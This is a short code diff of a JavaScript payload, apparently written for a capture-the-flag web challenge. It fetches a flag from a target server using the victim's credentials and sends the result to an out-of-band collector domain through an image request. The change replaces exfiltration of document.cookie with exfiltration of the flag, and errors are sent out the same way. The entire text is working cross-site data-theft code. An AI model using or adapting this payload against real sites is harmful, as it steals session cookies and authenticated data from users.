@@ -5,7 +5,7 @@
 fetch('http://34.134.162.213:17001/get_flag', { credentials: 'include' })
   .then(res => res.text())
   .then(flag => {
-    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(document.cookie);
+    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag);
   })
   .catch(err => {
     new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?err=' + btoa(err);
